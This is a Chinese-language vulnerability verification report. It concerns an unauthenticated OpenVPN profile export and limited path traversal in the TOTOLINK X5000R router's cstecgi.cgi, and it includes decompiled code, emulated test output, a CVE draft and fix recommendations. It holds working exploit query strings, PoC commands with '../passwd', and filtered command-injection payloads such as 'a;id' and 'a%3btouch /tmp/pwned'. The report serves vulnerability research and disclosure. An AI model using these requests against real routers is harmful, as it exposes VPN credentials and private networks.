# TOTOLINK X5000R cstecgi.cgi exportOvpn 未授权 OpenVPN 文件导出漏洞验证报告

## 结论

在排除已知 `action=telnet` 漏洞后，继续深挖三个固件，确认 TOTOLINK X5000R 的 `/web/cgi-bin/cstecgi.cgi` 存在一个独立漏洞点：

```text
exportOvpn 分支在未登录、无 token 条件下允许导出 OpenVPN 用户配置文件，并存在限定路径穿越读取。
```

已在以下版本完成动态验证：

- `V9.1.0cu.2415_B20250515`
- `V9.1.0cu.2350_B20230313`

该问题和 `CVE-2025-13184` 不同，后者是 `action=telnet` 未授权开启 Telnet。本问题也不按 RCE 定性；本次验证显示 `;`、`|`、反引号、`$()` 等典型命令注入字符会被过滤。

## 漏洞入口

目标组件：

```text
/web/cgi-bin/cstecgi.cgi
```

触发入口：

```text
/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name=<username>&mode=config
/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name=<username>&filetype=gz
```

注意：参数顺序必须匹配固件解析逻辑。`cstecgi.cgi` 使用固定位置解析 query string：

```text
arg0: exportOvpn
arg1: type=user
arg2: name=<username>
arg3: mode=config 或 filetype=gz
```

乱序请求会失败，例如：

```text
exportOvpn&name=alice&type=user&mode=config
```

## 根因分析

反编译复核显示，`exportOvpn` 分支位于常规 JSON `topicurl/token/remote_ipaddr` 校验之前：

```c
pcVar6 = strstr(local_190c, "exportOvpn");
if (pcVar6 != NULL) {
    ...
}
```

当 `type=user` 时，程序从 query string 取出用户名：

```c
getNthValueSafe(2, local_190c, '&', item, 0x80);
getNthValueSafe(1, item, '=', username, 0x80);
```

随后拼接命令和导出路径：

```c
snprintf(cmd, 0x100, "openvpn-cert build_user %s config", username);
system(cmd);
snprintf(path, 0x80, "/etc/openvpn/server/user/%s.ovpn", username);
fopen(path, "rb");
```

请求 `filetype=gz` 时：

```c
snprintf(cmd, 0x100, "openvpn-cert build_user %s gz", username);
system(cmd);
snprintf(path, 0x80, "/etc/openvpn/server/user/%s.tar.gz", username);
fopen(path, "rb");
```

问题点：

- `exportOvpn` 分支在 token 校验前。
- 用户名虽然经过命令字符过滤，但没有做路径规范化。
- 如果文件存在，程序直接 HTTP 200 返回文件内容。
- `name=../passwd` 会拼接为 `/etc/openvpn/server/user/../passwd.ovpn`，等价于 `/etc/openvpn/server/passwd.ovpn`。

## 动态验证

验证脚本：

```text
scripts/probe_totolink_exportovpn_versions.sh
```

证据文件：

```text
inout/work/deepdive/exportovpn_versions/combined_evidence.txt
```

验证方式：

- 使用原始 MIPS `cstecgi.cgi` 与固件动态库。
- 复制临时 rootfs，不修改原始固件。
- 在临时 rootfs 中预置 OpenVPN 导出文件，用于模拟真实设备已生成用户配置的运行时状态。
- 使用 chroot + `qemu-mipsel-static` 执行 CGI。
- 使用 `/bin/sh` wrapper 记录 `system()` 调用。

### 最新版验证结果

普通 `.ovpn` 导出：

```text
exportOvpn&type=user&name=alice&mode=config
HTTP/1.1 200 OK

OVPN_SECRET_FOR_ALICE
```

`.tar.gz` 导出：

```text
exportOvpn&type=user&name=alice&filetype=gz
HTTP/1.1 200 OK

TARGZ_SECRET_FOR_ALICE
```

路径穿越读取 `.ovpn`：

```text
exportOvpn&type=user&name=../passwd&mode=config
HTTP/1.1 200 OK

TRAVERSAL_SECRET
```

路径穿越读取 `.tar.gz`：

```text
exportOvpn&type=user&name=../passwd&filetype=gz
HTTP/1.1 200 OK

TRAVERSAL_GZ_SECRET
```

命令记录：

```text
openvpn-cert build_user alice config
openvpn-cert build_user alice gz
openvpn-cert build_user ../passwd config
openvpn-cert build_user ../passwd gz
```

旧版 `V9.1.0cu.2350_B20230313` 同样复现上述行为。

## 边界测试

已确认失败或被限制的情况：

```text
exportOvpn&name=alice&type=user&mode=config     -> 参数乱序失败
name=a;id                                      -> 501，过滤
name=a|id                                      -> 501，过滤
name=a`id`                                     -> 501，过滤
name=a$(id)                                    -> 501，过滤
name=..%2fpasswd                               -> 不解码为路径，未命中
name=../../passwd                              -> 当前预置场景未命中
name=/etc/passwd                               -> 当前预置场景未命中
```

因此当前漏洞定性是：

```text
未授权 OpenVPN 文件导出 + 限定路径穿越读取
```

不是任意文件读取，也不是已证明的命令注入/RCE。

## RCE 尝试结果

已额外针对 `exportOvpn` 做 RCE 方向测试，验证脚本：

```text
scripts/probe_totolink_exportovpn_rce_attempts.sh
scripts/test_totolink_shell_metachar_runtime.sh
```

证据目录：

```text
inout/work/deepdive/exportovpn_rce_attempts/
inout/work/deepdive/shell_meta_runtime/
```

测试结论：

- `;`、`|`、反引号、`$()`、原始换行会被过滤，返回 501 或不进入危险命令。
- URL 编码的 `%3b`、`%7c`、`%26`、`%0a` 不会被解码为 shell 元字符，而是作为普通字符串进入命令。
- 空格、tab、回车可进入命令字符串，但真实 BusyBox `/bin/sh` 中：
  - tab/space 只作为参数分隔，不触发额外命令；
  - CR `\r` 不作为命令分隔符；
  - 分号和 LF 可以分隔命令，但已被过滤函数拦截。
- `filetype` 参数不会参与命令拼接；只有固定字符串 `config` 或 `gz` 进入命令。
- 固件样本中未找到 `openvpn-cert` 实体文件，无法进一步验证该命令本身是否存在脚本级参数注入。

观察到可进入 `system()` 的非 RCE 参数形态：

```text
openvpn-cert build_user a%3btouch%20/tmp/pwned config
openvpn-cert build_user a%7ctouch%20/tmp/pwned config
openvpn-cert build_user a%0atouch%20/tmp/pwned config
openvpn-cert build_user a b config
openvpn-cert build_user --help config
openvpn-cert build_user alice --help config
```

这些目前没有形成额外命令执行。当前不能把该漏洞升级为 RCE；更稳妥的结论仍是未认证敏感文件导出与路径穿越读取。

## PoC

PoC 文件：

```text
pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py
```

读取普通用户配置：

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user alice
```

读取压缩包：

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user alice --gz
```

路径穿越测试：

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd --gz
```

只生成请求路径：

```bash
python pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py http://192.168.0.1 --user ../passwd --path-only
```

## 真实利用条件

真实设备上需要满足以下条件之一：

- OpenVPN 用户配置已存在于 `/etc/openvpn/server/user/<name>.ovpn`；
- OpenVPN 导出包已存在于 `/etc/openvpn/server/user/<name>.tar.gz`；
- `openvpn-cert build_user <name> config/gz` 能生成对应文件；
- `/etc/openvpn/server/` 上级目录存在可通过 `../<name>.ovpn` 或 `../<name>.tar.gz` 命中的敏感文件。

固件样本默认不包含真实 OpenVPN 用户导出文件，因此本地 harness 通过预置文件模拟“设备已生成配置”的真实运行时状态。该方法能证明 CGI 的认证缺失、路径拼接和文件返回逻辑真实存在，但真机影响强度仍取决于是否启用 OpenVPN 及是否生成过用户证书。

## CVE 价值

该漏洞有争取新 CVE 的价值，但提交时应避免夸大。

建议标题：

```text
TOTOLINK X5000R cstecgi.cgi exportOvpn pre-authenticated OpenVPN profile disclosure and limited path traversal
```

建议描述：

```text
TOTOLINK X5000R cstecgi.cgi exportOvpn handler processes OpenVPN export requests before authentication. A remote unauthenticated attacker can download existing OpenVPN user profiles or archives, and can use ../ in the username parameter to read matching .ovpn or .tar.gz files outside the user subdirectory under /etc/openvpn/server.
```

## 重复风险

已知公开项：

- `CVE-2025-13184`：`action=telnet` 未授权开启 Telnet。
- `CVE-2025-14586`：`exportOvpn&type=user` 命令注入，公开影响版本为 `9.1.0cu.2089_B20211224`。

本报告候选与上述不同：

- 不涉及 `action=telnet`。
- 当前版本中命令注入字符被过滤，未按 RCE 提交。
- 本漏洞点是未认证文件导出和路径穿越读取。

由于同属 `exportOvpn` endpoint，提交时存在被 CNA 认为与历史 `exportOvpn` 问题相关的风险；但漏洞类型、可利用效果和验证版本不同，仍可作为独立问题尝试提交。

## 修复建议

1. 将 `exportOvpn` 分支移动到统一 token/会话校验之后。
2. `username` 使用严格白名单，例如 `^[A-Za-z0-9_-]{1,64}$`。
3. 使用 `realpath()` 或等价逻辑确认最终路径位于 `/etc/openvpn/server/user/` 下。
4. 禁止未认证请求触发 `openvpn-cert build_user`。
5. 导出 OpenVPN 配置前必须验证管理员权限。
